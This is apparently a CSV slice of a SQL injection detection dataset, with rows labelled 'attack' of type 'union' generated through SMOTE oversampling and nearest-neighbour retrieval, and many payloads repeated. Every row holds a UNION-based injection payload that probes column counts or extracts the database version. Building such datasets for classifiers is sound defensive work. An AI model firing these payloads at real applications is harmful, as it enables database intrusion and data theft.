id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
SMOTE_001199,attack,union,"-9110""   )    )    union all select 2263,2263,2263,2263,2263#",nearest_attack_euclidean,R000059,1.731396924174359
SMOTE_001200,attack,union," select * from users where id  =  '1' union select @ 1,version  (    )   --  1'",nearest_attack_euclidean,R000005,0.543009450679472
SMOTE_001201,attack,union,"-8772%' union all select 4909,4909,4909,4909,4909,4909,4909,4909,4909#",nearest_attack_euclidean,R000024,0.728015887288195
SMOTE_001202,attack,union,"-4373'+  (  select 'rlht' where 2285  =  2285 union all select 2285,2285,2285#",nearest_attack_euclidean,R000015,0.19010493191461844
SMOTE_001203,attack,union,"-2207%'   )    )    union all select 3339,3339,3339,3339,3339,3339#",nearest_attack_euclidean,R000073,1.4334315309899164
SMOTE_001204,attack,union,"1'  )   union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000046,0.945287473601609
SMOTE_001205,attack,union,"-4330' union all select 3059,3059,3059,3059,3059,3059,3059,3059,3059--",nearest_attack_euclidean,R000075,0.9636847138637663
SMOTE_001206,attack,union,"-4373'+  (  select 'rlht' where 2285  =  2285 union all select 2285,2285,2285#",nearest_attack_euclidean,R000015,2.276269766367756
SMOTE_001207,attack,union," select * from users where id  =  1 +$ . union select null,@@VERSION -- 1",nearest_attack_euclidean,R000002,1.950210118039143
SMOTE_001208,attack,union,"1""  )   as boeh where 2571  =  2571 union all select null#",nearest_attack_euclidean,R000056,0.3549878376031974
SMOTE_001209,attack,union,"-8772%' union all select 4909,4909,4909,4909,4909,4909,4909,4909,4909#",nearest_attack_euclidean,R000024,0.9113636675521946
SMOTE_001210,attack,union,"1'+  (  select vlut where 9517  =  9517 union all select null,null,null--",nearest_attack_euclidean,R000021,2.0673529943833366
SMOTE_001211,attack,union," select * from users where id  =  1 +$ . union select null,@@VERSION -- 1",nearest_attack_euclidean,R000002,0.16794801791776906
SMOTE_001212,attack,union," select * from users where id  =  1 +$ . union select null,@@VERSION -- 1",nearest_attack_euclidean,R000002,1.313475239557318
SMOTE_001213,attack,union,"-4205' union all select 8986,8986,8986,8986,8986,8986,8986,8986,8986,8986#",nearest_attack_euclidean,R000051,0.12323402434688979
SMOTE_001214,attack,union,"-3116""   )    )     )   union all select 4600,4600,4600,4600--",nearest_attack_euclidean,R000063,0.7039586021267702
SMOTE_001215,attack,union," select * from users where id  =  1 or \.<$ union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000008,0.07059925509936
SMOTE_001216,attack,union,"1%' union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000032,0.2377026529390263
SMOTE_001217,attack,union,"-2625""   )    )    as qfuo where 1980  =  1980 union all select 1980,1980,1980--",nearest_attack_euclidean,R000076,1.0719282427419565
SMOTE_001218,attack,union,"-2639""  )   where 1494  =  1494 union all select 1494--",nearest_attack_euclidean,R000045,0.9616943880764723
SMOTE_001219,attack,union,"1 union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000022,1.4365231472038966
SMOTE_001220,attack,union,"-3997'+  (  select 'avjk' where 1917  =  1917 union all select 1917,1917,1917--",nearest_attack_euclidean,R000061,2.353760301322157
SMOTE_001221,attack,union,"-1894'  )   union all select 8123,8123,8123,8123,8123,8123,8123,8123,8123#",nearest_attack_euclidean,R000050,0.2518170538024432
SMOTE_001222,attack,union,"-7531'  )   union all select 3072,3072,3072,3072,3072,3072,3072--",nearest_attack_euclidean,R000016,0.04175291985290209
SMOTE_001223,attack,union,"1""   )    )     )   union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000071,1.3992616033165592
SMOTE_001224,attack,union,"1%'  )   union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000020,0.6177125126182235
SMOTE_001225,attack,union,"-4542 union all select 1249,1249,1249,1249,1249,1249,1249,1249,1249--",nearest_attack_euclidean,R000025,0.12521000470358196
SMOTE_001226,attack,union,"-3596'  )   union all select 5349,5349,5349,5349,5349,5349#",nearest_attack_euclidean,R000013,0.22337662292839977
SMOTE_001227,attack,union,"-3879' union all select 9814,9814,9814,9814,9814,9814,9814,9814,9814--",nearest_attack_euclidean,R000031,1.012606836132676
SMOTE_001228,attack,union,"1'  )   as hats where 2011  =  2011 union all select null,null,null,null,null#",nearest_attack_euclidean,R000027,0.014300229054838196
SMOTE_001229,attack,union,"1'  )   where 8268  =  8268 union all select null,null,null,null--",nearest_attack_euclidean,R000066,1.9172928205396451
SMOTE_001230,attack,union,"1  )   union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000014,0.09019505178791454
SMOTE_001231,attack,union,"1'  )   where 8268  =  8268 union all select null,null,null,null--",nearest_attack_euclidean,R000066,0.2747746609525029
SMOTE_001232,attack,union,"-8073   )    )     )   union all select 4481,4481,4481,4481--",nearest_attack_euclidean,R000062,1.0768542815123678
SMOTE_001233,attack,union,"-1134 union all select 1297,1297,1297,1297,1297,1297,1297,1297,1297--",nearest_attack_euclidean,R000038,0.7316873062753496
SMOTE_001234,attack,union,"1 union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000022,1.0628294851709152
SMOTE_001235,attack,union,"-9860%"" union all select 6996,6996,6996,6996,6996,6996#",nearest_attack_euclidean,R000039,1.7223953448571205
SMOTE_001236,attack,union,"1' in boolean mode  )   union all select null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000042,1.488733265431618
SMOTE_001237,attack,union,"1%'  )   union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000020,1.7159602998753876
SMOTE_001238,attack,union,"-3879' union all select 9814,9814,9814,9814,9814,9814,9814,9814,9814--",nearest_attack_euclidean,R000031,0.04316431597337805
SMOTE_001239,attack,union,"-3781%'  )   union all select 7497,7497,7497,7497,7497--",nearest_attack_euclidean,R000068,1.1077897190407195
SMOTE_001240,attack,union,"-8308""  )   union all select 3084,3084,3084,3084,3084,3084,3084,3084,3084#",nearest_attack_euclidean,R000069,0.09423965487826225
SMOTE_001241,attack,union," select * from users where id  =  1 union select @&&@,version  (    )   -- 1",nearest_attack_euclidean,R000012,2.324848530234833
SMOTE_001242,attack,union,"1'  )   union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000018,1.7621299154446244
SMOTE_001243,attack,union,"-2207%'   )    )    union all select 3339,3339,3339,3339,3339,3339#",nearest_attack_euclidean,R000073,0.18953805087763084
SMOTE_001244,attack,union,"1'  )   union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000018,0.3299899695125085
SMOTE_001245,attack,union,"1%""   )    )    union all select null,null,null,null,null#",nearest_attack_euclidean,R000044,0.3274664565327576
SMOTE_001246,attack,union,"1'   )    )     )   union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000041,1.8007619436505728
SMOTE_001247,attack,union,"1%""   )    )    union all select null,null,null,null,null#",nearest_attack_euclidean,R000044,0.8550894095500725
SMOTE_001248,attack,union," select * from users where id  =  1 union select @ $$,version  (    )   -- 1",nearest_attack_euclidean,R000011,1.1970962521585953
SMOTE_001249,attack,union,"1' where 2774  =  2774 union all select null,null,null,null,null#",nearest_attack_euclidean,R000060,0.47798904732417347
SMOTE_001250,attack,union,"-2625""   )    )    as qfuo where 1980  =  1980 union all select 1980,1980,1980--",nearest_attack_euclidean,R000076,1.5788679884448396
SMOTE_001251,attack,union," select * from users where id  =  1 union select @ $$,version  (    )   -- 1",nearest_attack_euclidean,R000011,0.6409365426541266
SMOTE_001252,attack,union,"-2190'  )   where 8890  =  8890 union all select 8890,8890#",nearest_attack_euclidean,R000078,1.398253983899473
SMOTE_001253,attack,union,"-6294"" union all select 9921,9921,9921,9921,9921,9921--",nearest_attack_euclidean,R000052,0.7080923775614345
SMOTE_001254,attack,union,"1%""   )    )    union all select null,null,null,null,null--",nearest_attack_euclidean,R000065,1.2658931617107312
SMOTE_001255,attack,union," select * from users where id  =  1 or $ .  =  1 union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000001,1.0862526982802303
SMOTE_001256,attack,union,"-7296%'   )    )     )   union all select 9322,9322,9322,9322--",nearest_attack_euclidean,R000047,0.1717985099716551
SMOTE_001257,attack,union,"-8073   )    )     )   union all select 4481,4481,4481,4481--",nearest_attack_euclidean,R000062,1.3819437377486194
SMOTE_001258,attack,union,"-3116""   )    )     )   union all select 4600,4600,4600,4600--",nearest_attack_euclidean,R000063,1.8208686745898857
SMOTE_001259,attack,union," select * from users where id  =  1 union select @&&@,version  (    )   -- 1",nearest_attack_euclidean,R000012,0.8157809513679735
SMOTE_001260,attack,union,"-5748' union all select 1224,1224,1224,1224,1224,1224,1224,1224,1224#",nearest_attack_euclidean,R000058,0.02111929041261012
SMOTE_001261,attack,union," select * from users where id  =  '1' union select @ 1,version  (    )   --  1'",nearest_attack_euclidean,R000005,0.4570336612498638
SMOTE_001262,attack,union,"1'+  (  select vlut where 9517  =  9517 union all select null,null,null--",nearest_attack_euclidean,R000021,1.0926869287997976
SMOTE_001263,attack,union,"1""   )    )     )   union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000071,0.4111038709387304
SMOTE_001264,attack,union," select * from users where id  =  1 union select @ 1a,version  (    )   -- 1",nearest_attack_euclidean,R000004,0.2655014280371331
SMOTE_001265,attack,union,"1'  )   union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000033,0.09345326477904486
SMOTE_001266,attack,union,"-7296%'   )    )     )   union all select 9322,9322,9322,9322--",nearest_attack_euclidean,R000047,0.31790207596023823
SMOTE_001267,attack,union," select * from users where id  =  1 or \.<$ union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000008,0.8803823477289473
SMOTE_001268,attack,union," select * from users where id  =  1 +$ . union select null,@@VERSION -- 1",nearest_attack_euclidean,R000002,0.3492011799109768
SMOTE_001269,attack,union,"1%'  )   union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000020,0.43928645335420585
SMOTE_001270,attack,union,"-8073   )    )     )   union all select 4481,4481,4481,4481--",nearest_attack_euclidean,R000062,1.8708245668232784
SMOTE_001271,attack,union,"1'  )   union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000046,1.2758094544318113
SMOTE_001272,attack,union,"-6097%'   )    )    union all select 3990,3990,3990,3990,3990,3990--",nearest_attack_euclidean,R000057,0.9829099938201533
SMOTE_001273,attack,union,"-6097%'   )    )    union all select 3990,3990,3990,3990,3990,3990--",nearest_attack_euclidean,R000057,0.42840695243448956
SMOTE_001274,attack,union,"-9156'   )    )    union all select 9110,9110,9110,9110#",nearest_attack_euclidean,R000026,1.6623510620486919
SMOTE_001275,attack,union,"1' union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000054,0.44469778391190434
SMOTE_001276,attack,union,"-2625""   )    )    as qfuo where 1980  =  1980 union all select 1980,1980,1980--",nearest_attack_euclidean,R000076,0.11979417478237414
SMOTE_001277,attack,union,"1   )    )     )   union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000029,0.2844659646609694
SMOTE_001278,attack,union,"-6097%'   )    )    union all select 3990,3990,3990,3990,3990,3990--",nearest_attack_euclidean,R000057,1.1959485264917649
SMOTE_001279,attack,union,"1%""   )    )    union all select null,null,null,null,null#",nearest_attack_euclidean,R000044,0.36418938021261515
SMOTE_001280,attack,union," select * from users where id  =  1 or $ .  =  1 union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000001,1.555383626585983
SMOTE_001281,attack,union,"1'  )   where 8268  =  8268 union all select null,null,null,null--",nearest_attack_euclidean,R000066,1.268158462216454
SMOTE_001282,attack,union,"-8521'  )   union all select 2446,2446,2446,2446,2446,2446,2446#",nearest_attack_euclidean,R000067,0.8575575528955298
SMOTE_001283,attack,union,"-4966%"" union all select 4300,4300,4300,4300,4300,4300,4300,4300#",nearest_attack_euclidean,R000035,0.5602176317377505
SMOTE_001284,attack,union,1'  )   as gogu where 4338  =  4338 union all select null#,nearest_attack_euclidean,R000040,0.23411160853612645
SMOTE_001285,attack,union,"-8521'  )   union all select 2446,2446,2446,2446,2446,2446,2446#",nearest_attack_euclidean,R000067,0.03672151050770342
SMOTE_001286,attack,union,"1'   )    )     )   union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000041,0.1408160558846524
SMOTE_001287,attack,union,"-5131'   )    )     )   union all select 4854,4854,4854,4854,4854,4854,4854#",nearest_attack_euclidean,R000049,0.6002873830206483
SMOTE_001288,attack,union,"1'  )   where 8268  =  8268 union all select null,null,null,null--",nearest_attack_euclidean,R000066,1.7338326816586487
SMOTE_001289,attack,union," select * from users where id  =  1 *$ . union select null,@@VERSION -- 1",nearest_attack_euclidean,R000009,0.055808425895174485
SMOTE_001290,attack,union,"-3370""  )   union all select 7845,7845,7845,7845,7845,7845#",nearest_attack_euclidean,R000019,0.3584140350331938
SMOTE_001291,attack,union," select * from users where id  =  1 + \+*$ union select null,@@VERSION -- 1",nearest_attack_euclidean,R000006,0.983640816334661
SMOTE_001292,attack,union,"1' union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000054,0.7151898602505916
SMOTE_001293,attack,union," select * from users where id  =  '1' + $+*$ union select 1,@@VERSION -- 1'",nearest_attack_euclidean,R000007,2.0064978414221315
SMOTE_001294,attack,union,"1'  )   union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000033,1.1834314935000447
SMOTE_001295,attack,union,"1   )    )     )   union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000029,1.6718330715419965
SMOTE_001296,attack,union,"-3997'+  (  select 'avjk' where 1917  =  1917 union all select 1917,1917,1917--",nearest_attack_euclidean,R000061,0.8691869163116696
SMOTE_001297,attack,union,"-3781%'  )   union all select 7497,7497,7497,7497,7497--",nearest_attack_euclidean,R000068,1.3551117194233042
SMOTE_001298,attack,union,"-9860%"" union all select 6996,6996,6996,6996,6996,6996#",nearest_attack_euclidean,R000039,1.4062231072741296
SMOTE_001299,attack,union,"1'  )   union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000046,1.2120380465168143
SMOTE_001300,attack,union,"-4711%""   )    )    union all select 6737,6737,6737,6737#",nearest_attack_euclidean,R000077,1.5481893306112584
SMOTE_001301,attack,union,"-8073   )    )     )   union all select 4481,4481,4481,4481--",nearest_attack_euclidean,R000062,0.16139866101468006
SMOTE_001302,attack,union,"1%""   )    )    union all select null,null,null,null,null#",nearest_attack_euclidean,R000044,1.2863245038123998
SMOTE_001303,attack,union,"-5748' union all select 1224,1224,1224,1224,1224,1224,1224,1224,1224#",nearest_attack_euclidean,R000058,0.003248128547768919
